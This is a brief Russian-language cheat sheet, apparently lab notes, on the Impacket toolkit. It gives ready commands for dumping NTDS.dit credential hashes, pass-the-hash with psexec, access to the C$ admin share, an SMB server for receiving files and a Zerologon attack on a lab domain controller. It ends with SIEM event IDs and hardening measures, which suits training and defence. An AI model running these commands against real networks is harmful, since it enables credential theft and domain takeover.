# Impacket — набор инструментов для работы с протоколами Windows

## Описание
**Impacket** — библиотека и набор скриптов на Python для работы с сетевыми протоколами Windows (SMB, RPC, LDAP, Kerberos).

## Основные команды и примеры

### 1. Извлечение NTDS.DIT и SYSTEM (secretsdump)
```bash
impacket-secretsdump -ntds "/path/to/ntds.dit" -system /path/to/SYSTEM LOCAL >> ntds_impacket.txt
```

### 2. Аутентификация через NTLM-хэш (Pass-the-Hash)
```bash
psexec.py DOMAIN/user@target -hashes :<NTLM_HASH>
```

### 3. Доступ к административной шаре C$
```bash
smbclient.py DOMAIN/user@target -hashes :<NTLM_HASH> -share C$
```

### 4. SMB-сервер для приёма файлов
```bash
impacket-smbserver -smb2support Share /home/kali/111
```

### 5. Атака Zerologon + извлечение хеша
```bash
python3 set_empty_pw.py POD68-WS2016 10.0.68.5
impacket-secretsdump -hashes :<ntlm_hash> 'LAB68/POD68-WS2016$@10.0.68.5'
```

## На что обратить внимание в SIEM
- Event ID 4624 (Logon Type 3) от нетипичных IP.
- Доступ к `C$`/`ADMIN$` (Event ID 5140/5145).
- Создание/изменение учёток (Event ID 4741, 4723).

## Меры защиты
- Ограничить вход админских учёток на рабочие станции.
- Включить SMB/LDAP signing.
- Ограничить MachineAccountQuota.
- Запретить NTLM (Restrict NTLM).
